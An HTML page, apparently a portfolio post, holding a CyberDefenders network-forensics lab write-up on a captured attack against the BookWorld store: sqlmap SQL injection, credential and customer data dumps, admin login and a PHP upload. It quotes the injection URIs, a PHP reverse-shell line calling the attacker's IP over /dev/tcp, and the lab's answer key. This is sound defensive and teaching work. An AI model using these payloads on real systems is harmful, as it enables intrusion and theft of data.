@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Web Investigation Lab — CyberDefenders Writeup</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+
+<body>
+  <header class="topbar">
+    <div class="wrap topbar-inner">
+      <a class="brand" href="/">ThaiNgoc :~$</a>
+      <nav class="nav">
+        <a href="/">Home</a>
+        <a href="/writeups/">Writeups</a>
+        <a href="/achievements/">Achievements</a>
+        <a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap writeup-layout">
+    <aside class="toc glass-card">
+      <div class="toc-title">Contents</div>
+      <a href="#summary">Executive Summary</a>
+      <a href="#info">Lab Information</a>
+      <a href="#triage">Initial PCAP Triage</a>
+      <a href="#protocol">Protocol Hierarchy</a>
+      <a href="#conversations">Conversations</a>
+      <a href="#post">POST Requests</a>
+      <a href="#sqli">SQL Injection</a>
+      <a href="#data-leak">Data Disclosure</a>
+      <a href="#admin">Admin Compromise</a>
+      <a href="#upload">Malicious Upload</a>
+      <a href="#timeline">Timeline</a>
+      <a href="#ioc">IOCs</a>
+      <a href="#questions">Lab Questions</a>
+      <a href="#lessons">Lessons Learned</a>
+    </aside>
+
+    <article class="writeup-content">
+      <section class="hero glass-card">
+        <p class="eyebrow">CyberDefenders · Network Forensics · SOC Investigation</p>
+        <h1>Web Investigation Lab</h1>
+        <p class="hero-subtitle">
+          Investigating suspicious HTTP traffic, SQL Injection, credential disclosure,
+          admin panel compromise, and malicious PHP upload in a captured network trace.
+        </p>
+
+        <div class="meta-grid">
+          <div>
+            <span>Platform</span>
+            <strong>CyberDefenders</strong>
+          </div>
+          <div>
+            <span>Category</span>
+            <strong>Network Forensics</strong>
+          </div>
+          <div>
+            <span>Tactics</span>
+            <strong>Initial Access · Persistence · C2</strong>
+          </div>
+          <div>
+            <span>Tools</span>
+            <strong>Wireshark · NetworkMiner</strong>
+          </div>
+        </div>
+      </section>
+
+      <section id="summary" class="glass-card section-card">
+        <h2>Executive Summary</h2>
+        <p>
+          This investigation focused on analyzing a packet capture from BookWorld, an online bookstore
+          that experienced an unusual spike in database queries and server resource usage.
+        </p>
+        <p>
+          By analyzing <code>WebInvestigation.pcap</code>, I identified that the attacker used
+          <code>sqlmap</code> to exploit a SQL Injection vulnerability in the <code>search</code>
+          parameter of <code>search.php</code>. Through this vulnerability, the attacker extracted
+          database information, dumped sensitive customer data, and retrieved valid admin credentials.
+        </p>
+        <p>
+          After obtaining the admin credentials, the attacker logged into the admin dashboard and uploaded
+          a malicious PHP script designed to establish a reverse shell connection back to the attacker-controlled IP.
+        </p>
+
+        <div class="callout danger">
+          <strong>Impact:</strong> The incident involved confirmed SQL Injection exploitation,
+          credential disclosure, customer PII exposure, admin dashboard compromise, and attempted server-level access.
+        </div>
+      </section>
+
+      <section id="info" class="glass-card section-card">
+        <h2>Lab Information</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Details</th></tr>
+            <tr><td>Title</td><td>Web Investigation Lab</td></tr>
+            <tr><td>Platform</td><td>CyberDefenders</td></tr>
+            <tr><td>Category</td><td>Network Forensics</td></tr>
+            <tr><td>Tactics</td><td>Initial Access, Persistence, Command and Control</td></tr>
+            <tr><td>Evidence</td><td><code>WebInvestigation.pcap</code></td></tr>
+            <tr><td>Target Organization</td><td>BookWorld</td></tr>
+            <tr><td>Author</td><td>Nguyen Thai Ngoc</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="triage" class="glass-card section-card">
+        <h2>1. Initial PCAP Triage</h2>
+        <p>
+          I started by reviewing the capture file properties in Wireshark to understand the scope of the evidence
+          before analyzing individual packets.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-02-capture-file-properties.png" alt="Wireshark capture file properties for WebInvestigation.pcap">
+          <figcaption>Capture file properties showing timeframe, packet count, file size, and hashes.</figcaption>
+        </figure>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>File name</td><td><code>WebInvestigation.pcap</code></td></tr>
+            <tr><td>File size</td><td>30 MB</td></tr>
+            <tr><td>SHA256</td><td><code>cf31ec09cf2ece5d0a55c750a0fee19af3ab34d4b7125c4781a56025e2721647</code></td></tr>
+            <tr><td>SHA1</td><td><code>ea5718ac4028b8366e196f59c3b907c7737633d4</code></td></tr>
+            <tr><td>First packet</td><td><code>2024-03-15 18:39:21</code></td></tr>
+            <tr><td>Last packet</td><td><code>2024-03-15 19:26:33</code></td></tr>
+            <tr><td>Duration</td><td><code>00:47:12</code></td></tr>
+            <tr><td>Total packets</td><td><code>88,862</code></td></tr>
+          </table>
+        </div>
+
+        <p>
+          This initial triage established the investigation timeframe. All suspicious activity, attacker behavior,
+          and timeline reconstruction were correlated within this capture window.
+        </p>
+      </section>
+
+      <section id="protocol" class="glass-card section-card">
+        <h2>2. Protocol Hierarchy Analysis</h2>
+        <p>
+          Next, I reviewed the Protocol Hierarchy to determine which protocols dominated the capture.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-03-protocol-hierarchy.png" alt="Wireshark protocol hierarchy showing mostly HTTP traffic">
+          <figcaption>HTTP accounted for most of the captured traffic, making web traffic the primary focus.</figcaption>
+        </figure>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Protocol</th><th>Observation</th></tr>
+            <tr><td>TCP</td><td>Approximately <code>99.9%</code> of packets</td></tr>
+            <tr><td>HTTP</td><td>Approximately <code>93.9%</code> of packets</td></tr>
+            <tr><td>UDP</td><td>Very small amount of traffic</td></tr>
+            <tr><td>Line-based text data</td><td>Significant HTTP text content</td></tr>
+          </table>
+        </div>
+
+        <p>
+          Since HTTP dominated the capture, I focused on request URIs, HTTP methods, response codes,
+          User-Agent values, POST bodies, and HTTP streams.
+        </p>
+      </section>
+
+      <section id="conversations" class="glass-card section-card">
+        <h2>3. Conversation Analysis</h2>
+        <p>
+          I checked IPv4 Conversations to identify the most active hosts and prioritize suspicious communications.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-04-ipv4-conversations.png" alt="IPv4 conversations showing attacker and victim traffic volume">
+          <figcaption>The largest conversation was between <code>111.224.250.131</code> and <code>73.124.22.98</code>.</figcaption>
+        </figure>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Address A</th><th>Address B</th><th>Packets</th><th>Bytes</th><th>Assessment</th></tr>
+            <tr>
+              <td><code>111.224.250.131</code></td>
+              <td><code>73.124.22.98</code></td>
+              <td><code>88,484</code></td>
+              <td><code>29 MB</code></td>
+              <td>Primary suspicious conversation</td>
+            </tr>
+            <tr>
+              <td><code>170.40.150.126</code></td>
+              <td><code>73.124.22.98</code></td>
+              <td><code>256</code></td>
+              <td><code>39 KB</code></td>
+              <td>Lower priority / normal browsing</td>
+            </tr>
+          </table>
+        </div>
+
+        <div class="callout">
+          <strong>Initial hypothesis:</strong> <code>111.224.250.131</code> was the attacker,
+          while <code>73.124.22.98</code> was the BookWorld web server.
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>4. Early HTTP Traffic Review</h2>
+        <p>
+          Some early packets showed <code>170.40.150.126</code> attempting to connect to port 443,
+          but the server responded with <code>RST, ACK</code>. Later, the same host made normal HTTP requests to port 80.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-05-initial-tcp-reset-443.png" alt="Initial TCP reset on port 443">
+          <figcaption>Initial HTTPS connection attempts were reset by the server.</figcaption>
+        </figure>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-06-normal-http-stream-170-40-150-126.png" alt="Normal HTTP stream to BookWorld homepage">
+          <figcaption>Normal browsing behavior to <code>bookworldstore.com</code>.</figcaption>
+        </figure>
+
+        <pre><code>GET / HTTP/1.1
+Host: bookworldstore.com
+User-Agent: Mozilla/5.0 ... Chrome/121.0.0.0
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.52 (Ubuntu)
+Content-Type: text/html</code></pre>
+
+        <p>
+          This traffic helped confirm the target domain and server but did not appear to be the main malicious activity.
+        </p>
+      </section>
+
+      <section id="post" class="glass-card section-card">
+        <h2>5. Suspicious POST Requests</h2>
+        <p>
+          To locate actions such as login attempts or file uploads, I filtered HTTP POST requests:
+        </p>
+
+        <pre><code>http.request.method == "POST"</code></pre>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-07-suspicious-post-requests.png" alt="Suspicious POST requests to admin login and admin index">
+          <figcaption>Multiple POST requests from the attacker to admin endpoints.</figcaption>
+        </figure>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Packet</th><th>Source</th><th>Destination</th><th>Request</th></tr>
+            <tr><td><code>88664</code></td><td><code>111.224.250.131</code></td><td><code>73.124.22.98</code></td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88677</code></td><td><code>111.224.250.131</code></td><td><code>73.124.22.98</code></td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88681</code></td><td><code>111.224.250.131</code></td><td><code>73.124.22.98</code></td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88699</code></td><td><code>111.224.250.131</code></td><td><code>73.124.22.98</code></td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88757</code></td><td><code>111.224.250.131</code></td><td><code>73.124.22.98</code></td><td><code>POST /admin/index.php</code></td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="sqli" class="glass-card section-card">
+        <h2>6. SQL Injection Activity with sqlmap</h2>
+        <p>
+          While reviewing HTTP traffic from <code>111.224.250.131</code>, I found many requests targeting:
+        </p>
+
+        <pre><code>/search.php?search=</code></pre>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-08-sqlmap-sqli-search-parameter.png" alt="sqlmap SQL injection requests">
+          <figcaption>The attacker used sqlmap to target the <code>search</code> parameter.</figcaption>
+        </figure>
+
+        <p>
+          The request headers revealed the tool used by the attacker:
+        </p>
+
+        <pre><code>User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)</code></pre>
+
+        <p>
+          SQL Injection indicators included keywords and functions such as <code>UNION</code>,
+          <code>SELECT</code>, <code>CHAR()</code>, <code>CASE WHEN</code>, and
+          <code>INFORMATION_SCHEMA</code>.
+        </p>
+
+        <div class="callout danger">
+          <strong>Confirmed attack vector:</strong> SQL Injection in the <code>search</code>
+          parameter of <code>search.php</code>.
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>7. First SQL Injection Attempt</h2>
+        <p>
+          The first decoded SQL Injection attempt was:
+        </p>
+
+        <pre><code>/search.php?search=book and 1=1; -- -</code></pre>
+
+        <p>
+          This request shows a simple boolean test against the <code>search</code> parameter,
+          indicating the beginning of SQL Injection probing.
+        </p>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>8. Database Enumeration</h2>
+        <p>
+          After confirming injection, the attacker enumerated available databases using
+          <code>INFORMATION_SCHEMA.SCHEMATA</code>.
+        </p>
+
+        <pre><code>/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -</code></pre>
+
+        <p>
+          The hex values were sqlmap markers used to identify extracted data in the HTTP response:
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Hex</th><th>Decoded Marker</th></tr>
+            <tr><td><code>0x7178766271</code></td><td><code>qxvbq</code></td></tr>
+            <tr><td><code>0x7a76676a636b</code></td><td><code>zvgjck</code></td></tr>
+            <tr><td><code>0x7176706a71</code></td><td><code>qvpjq</code></td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="data-leak" class="glass-card section-card">
+        <h2>9. Data Disclosure</h2>
+
+        <h3>Admin Credential Disclosure</h3>
+        <p>
+          Packet <code>1591</code> showed a successful SQL Injection payload extracting
+          <code>id</code>, <code>password</code>, and <code>username</code> from
+          <code>bookworld_db.admin</code>.
+        </p>
+
+        <pre><code>&lt;p&gt;qxvbq["1zvgjckadmin123!zvgjckadmin"]qvpjq&lt;/p&gt;</code></pre>
+
+        <p>
+          Splitting the response by <code>zvgjck</code> revealed:
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Field</th><th>Value</th></tr>
+            <tr><td>ID</td><td><code>1</code></td></tr>
+            <tr><td>Username</td><td><code>admin</code></td></tr>
+            <tr><td>Password</td><td><code>admin123!</code></td></tr>
+          </table>
+        </div>
+
+        <h3>Book Data Disclosure</h3>
+        <p>
+          Packet <code>1663</code> contained a UNION-based SQL Injection payload extracting
+          <code>id</code> and <code>title</code> from <code>bookworld_db.books</code>.
+        </p>
+
+        <pre><code>/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,title)),0x7176706a71) FROM bookworld_db.books-- -</code></pre>
+
+        <p>
+          The response exposed book records such as <code>The Great Gatsby</code>,
+          <code>1984</code>, <code>To Kill a Mockingbird</code>, and other book titles.
+        </p>
+
+        <h3>Customer PII Disclosure</h3>
+        <p>
+          The attacker also extracted customer records from <code>bookworld_db.customers</code>.
+          The extracted columns included:
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Column</th><th>Description</th></tr>
+            <tr><td><code>address</code></td><td>Customer address</td></tr>
+            <tr><td><code>email</code></td><td>Customer email</td></tr>
+            <tr><td><code>first_name</code></td><td>Customer first name</td></tr>
+            <tr><td><code>id</code></td><td>Customer ID</td></tr>
+            <tr><td><code>last_name</code></td><td>Customer last name</td></tr>
+            <tr><td><code>phone</code></td><td>Customer phone number</td></tr>
+          </table>
+        </div>
+
+        <div class="callout danger">
+          <strong>Data breach confirmed:</strong> The attacker extracted customer PII,
+          admin credentials, and book records from the database.
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>10. Directory Enumeration with Gobuster</h2>
+        <p>
+          Around packet <code>1681</code>, the attacker began directory enumeration activity using Gobuster.
+          This helped discover hidden or sensitive paths in the web application.
+        </p>
+
+        <pre><code>/admin/</code></pre>
+
+        <p>
+          The discovered <code>/admin/</code> directory became important later because the attacker used
+          the dumped admin credentials to log in to the admin panel.
+        </p>
+      </section>
+
+      <section id="admin" class="glass-card section-card">
+        <h2>11. Successful Admin Login</h2>
+        <p>
+          After dumping the admin credentials, the attacker submitted a login request to the admin panel.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-09-admin-login-success-dashboard-access.png" alt="Successful admin login and dashboard access">
+          <figcaption>Admin login succeeded, followed by access to <code>/admin/index.php</code>.</figcaption>
+        </figure>
+
+        <div class="table-wrap">
+          <table>
+            <tr><th>Packet</th><th>Event</th></tr>
+            <tr><td><code>88699</code></td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88701</code></td><td>Server returned <code>HTTP/1.1 302 Found</code></td></tr>
+            <tr><td><code>88703</code></td><td>Attacker requested <code>GET /admin/index.php</code></td></tr>
+            <tr><td><code>88704</code></td><td>Server returned <code>HTTP/1.1 200 OK</code></td></tr>
+          </table>
+        </div>
+
+        <pre><code>&lt;h1&gt;Welcome to the Admin Dashboard&lt;/h1&gt;
+&lt;p&gt;This is a protected area only accessible by authenticated users.&lt;/p&gt;</code></pre>
+
+        <p>
+          This confirmed that the attacker successfully authenticated to the protected admin dashboard.
+        </p>
+      </section>
+
+      <section id="upload" class="glass-card section-card">
+        <h2>12. Malicious PHP Upload</h2>
+        <p>
+          After accessing the admin dashboard, the attacker uploaded a PHP file through
+          <code>/admin/index.php</code>.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-10-malicious-php-upload-reverse-shell.png" alt="Malicious PHP reverse shell upload">
+          <figcaption>The attacker uploaded <code>NVri2vhp.php</code> through the admin dashboard.</figcaption>
+        </figure>
+
+        <pre><code>Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
+Content-Type: application/x-php</code></pre>
+
+        <p>
+          The uploaded PHP file attempted to execute a reverse shell back to the attacker:
+        </p>
+
+        <pre><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/111.224.250.131/443 0&gt;&amp;1'");?&gt;</code></pre>
+
+        <p>
+          The server confirmed the upload:
+        </p>
+
+        <pre><code>The file NVri2vhp.php has been uploaded.</code></pre>
+
+        <h3>Uploaded File Verification</h3>
+        <p>
+          The attacker then accessed <code>/admin/uploads/</code>. The server returned an Apache directory listing
+          showing the uploaded PHP file.
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-11-upload-directory-listing-webshell-visible.png" alt="Directory listing showing uploaded PHP file">
+          <figcaption>The uploaded PHP file was visible in <code>/admin/uploads/</code>.</figcaption>
+        </figure>
+
+        <pre><code>&lt;title&gt;Index of /admin/uploads&lt;/title&gt;
+&lt;a href="NVri2vhp.php"&gt;NVri2vhp.php&lt;/a&gt;</code></pre>
+
+        <div class="callout danger">
+          <strong>Post-exploitation attempt:</strong> The attacker uploaded a PHP reverse shell
+          and verified that the file existed in a web-accessible directory.
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>13. Post-upload Traffic Review</h2>
+        <p>
+          After reviewing the remaining packets, I mostly observed requests for default Apache directory listing icons:
+        </p>
+
+        <figure class="evidence">
+          <img src="/assets/images/writeups/web-investigation/web-investigation-12-post-upload-traffic-review.png" alt="Post upload traffic review showing Apache icons">
+          <figcaption>Remaining traffic mainly consisted of Apache directory listing icons and TCP teardown activity.</figcaption>
+        </figure>
+
+        <pre><code>GET /icons/blank.gif
+GET /icons/back.gif
+GET /icons/unknown.gif</code></pre>
+
+        <p>
+          These requests were generated when the browser rendered the Apache directory listing page.
+          I did not observe clear evidence that <code>NVri2vhp.php</code> was executed successfully or that
+          a reverse shell session was established within the remaining PCAP traffic.
+        </p>
+      </section>
+
+      <section id="timeline" class="glass-card section-card">
+        <h2>14. Investigation Timeline</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Packet / Time</th><th>Event</th><th>Evidence</th></tr>
+            <tr><td><code>18:39:21</code></td><td>PCAP capture started</td><td>Capture File Properties</td></tr>
+            <tr><td>Early packets</td><td>Normal browsing from <code>170.40.150.126</code></td><td><code>GET /</code>, CSS, favicon</td></tr>
+            <tr><td><code>267</code></td><td>Attacker communication begins</td><td>Traffic from <code>111.224.250.131</code></td></tr>
+            <tr><td>Early SQLi phase</td><td>First SQLi attempt</td><td><code>/search.php?search=book and 1=1; -- -</code></td></tr>
+            <tr><td><code>1591</code></td><td>Admin credentials dumped</td><td><code>bookworld_db.admin</code></td></tr>
+            <tr><td><code>1663</code></td><td>Book data dumped</td><td><code>bookworld_db.books</code></td></tr>
+            <tr><td><code>1681</code></td><td>Gobuster activity observed</td><td>Directory discovery</td></tr>
+            <tr><td>Later SQLi traffic</td><td>Customer PII dumped</td><td><code>bookworld_db.customers</code></td></tr>
+            <tr><td><code>88699</code></td><td>Admin login submitted</td><td><code>POST /admin/login.php</code></td></tr>
+            <tr><td><code>88701</code></td><td>Successful login redirect</td><td><code>HTTP/1.1 302 Found</code></td></tr>
+            <tr><td><code>88703-88704</code></td><td>Admin dashboard accessed</td><td><code>GET /admin/index.php</code>, <code>200 OK</code></td></tr>
+            <tr><td><code>88757</code></td><td>Malicious PHP uploaded</td><td><code>NVri2vhp.php</code></td></tr>
+            <tr><td><code>88833</code></td><td>Upload directory listed</td><td><code>/admin/uploads/</code></td></tr>
+            <tr><td><code>19:26:33</code></td><td>PCAP capture ended</td><td>Capture File Properties</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section id="ioc" class="glass-card section-card">
+        <h2>15. Indicators of Compromise</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>Indicator</th><th>Description</th></tr>
+            <tr><td>Attacker IP</td><td><code>111.224.250.131</code></td><td>Source IP responsible for SQLi, admin login, and upload</td></tr>
+            <tr><td>Attacker City</td><td><code>Shijiazhuang</code></td><td>Geographical origin from lab investigation</td></tr>
+            <tr><td>Victim IP</td><td><code>73.124.22.98</code></td><td>BookWorld web server</td></tr>
+            <tr><td>Domain</td><td><code>bookworldstore.com</code></td><td>Targeted web application</td></tr>
+            <tr><td>Vulnerable Script</td><td><code>search.php</code></td><td>SQL Injection entry point</td></tr>
+            <tr><td>Vulnerable Parameter</td><td><code>search</code></td><td>Injected parameter</td></tr>
+            <tr><td>Tool</td><td><code>sqlmap/1.8.3#stable</code></td><td>Automated SQL Injection tool</td></tr>
+            <tr><td>Directory Tool</td><td><code>Gobuster</code></td><td>Directory enumeration tool</td></tr>
+            <tr><td>Hidden Directory</td><td><code>/admin/</code></td><td>Discovered admin panel</td></tr>
+            <tr><td>Upload Directory</td><td><code>/admin/uploads/</code></td><td>Web-accessible upload location</td></tr>
+            <tr><td>Malicious File</td><td><code>NVri2vhp.php</code></td><td>Uploaded PHP reverse shell</td></tr>
+            <tr><td>C2 Callback</td><td><code>111.224.250.131:443</code></td><td>Reverse shell destination</td></tr>
+            <tr><td>Database</td><td><code>bookworld_db</code></td><td>Database accessed through SQLi</td></tr>
+            <tr><td>Customer Table</td><td><code>customers</code></td><td>Table containing customer PII</td></tr>
+            <tr><td>Admin Table</td><td><code>admin</code></td><td>Table containing admin credentials</td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>16. Key Findings</h2>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Finding</th><th>Severity</th><th>Evidence</th></tr>
+            <tr><td>SQL Injection in <code>search.php</code></td><td>Critical</td><td>sqlmap payloads targeting <code>/search.php?search=</code></td></tr>
+            <tr><td>Admin credentials exposed</td><td>Critical</td><td>SQLi dump from <code>bookworld_db.admin</code></td></tr>
+            <tr><td>Customer PII exposed</td><td>Critical</td><td>SQLi dump from <code>bookworld_db.customers</code></td></tr>
+            <tr><td>Admin dashboard compromised</td><td>Critical</td><td>Successful login and dashboard access</td></tr>
+            <tr><td>Malicious PHP uploaded</td><td>Critical</td><td><code>NVri2vhp.php</code> uploaded through admin panel</td></tr>
+            <tr><td>Directory listing enabled</td><td>High</td><td><code>/admin/uploads/</code> exposed uploaded file</td></tr>
+            <tr><td>Reverse shell attempted</td><td>Critical</td><td>PHP payload attempted callback to <code>111.224.250.131:443</code></td></tr>
+          </table>
+        </div>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>17. Recommendations</h2>
+        <ul class="clean-list">
+          <li>Use prepared statements and parameterized queries for all database operations.</li>
+          <li>Validate and sanitize all user-controlled input, especially the <code>search</code> parameter.</li>
+          <li>Reset the compromised admin password immediately.</li>
+          <li>Store passwords using strong hashing algorithms such as bcrypt or Argon2.</li>
+          <li>Enable MFA for admin accounts.</li>
+          <li>Block upload of executable file types such as <code>.php</code>, <code>.phtml</code>, and <code>.phar</code>.</li>
+          <li>Store uploaded files outside the web root.</li>
+          <li>Disable script execution in upload directories.</li>
+          <li>Disable Apache directory listing.</li>
+          <li>Monitor for <code>sqlmap</code> User-Agent strings and SQL keywords in HTTP request URIs.</li>
+        </ul>
+      </section>
+
+      <section id="questions" class="glass-card section-card">
+        <h2>18. Lab Questions</h2>
+
+        <div class="qa-card">
+          <h3>Q1. Can you provide the attacker's IP?</h3>
+          <pre><code>111.224.250.131</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q2. Can you determine the origin city of the attacker?</h3>
+          <pre><code>Shijiazhuang</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q3. Can you provide the vulnerable PHP script name?</h3>
+          <pre><code>search.php</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q4. What is the complete request URI of the first SQLi attempt?</h3>
+          <pre><code>/search.php?search=book and 1=1; -- -</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q5. Complete request URI used to read available databases?</h3>
+          <pre><code>/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q6. Table name containing website users data?</h3>
+          <pre><code>customers</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q7. Directory discovered by the attacker?</h3>
+          <pre><code>/admin/</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q8. Credentials used by the attacker for logging in?</h3>
+          <pre><code>admin:admin123!</code></pre>
+        </div>
+
+        <div class="qa-card">
+          <h3>Q9. Name of the malicious script uploaded by the attacker?</h3>
+          <pre><code>NVri2vhp.php</code></pre>
+        </div>
+      </section>
+
+      <section id="lessons" class="glass-card section-card">
+        <h2>19. Lessons Learned</h2>
+        <p>
+          This lab demonstrated how a single SQL Injection vulnerability can lead to a full compromise chain.
+          The attacker moved from vulnerability testing to database extraction, credential theft, admin access,
+          and malicious file upload.
+        </p>
+        <p>
+          From a SOC analyst perspective, this investigation reinforced the importance of starting with PCAP triage,
+          identifying dominant conversations, pivoting on suspicious IPs, following HTTP streams, decoding request URIs,
+          and correlating multiple events into a complete attack timeline.
+        </p>
+      </section>
+
+      <section class="glass-card section-card">
+        <h2>Conclusion</h2>
+        <p>
+          The BookWorld incident was caused by a SQL Injection vulnerability in <code>search.php</code>.
+          The attacker, identified as <code>111.224.250.131</code>, used sqlmap to exploit the vulnerable
+          <code>search</code> parameter and extract sensitive data from the database.
+        </p>
+        <p>
+          The attacker successfully obtained admin credentials, logged into the admin dashboard, and uploaded
+          a malicious PHP script named <code>NVri2vhp.php</code>. Although the uploaded script was designed
+          to create a reverse shell, the available PCAP did not show clear evidence that the reverse shell
+          was successfully executed.
+        </p>
+      </section>
+    </article>
+  </main>
+
+  <footer class="footer">
+    <div class="wrap">
+      <p>© Nguyen Thai Ngoc · Cybersecurity Portfolio</p>
+    </div>
+  </footer>
+</body>
+</html>
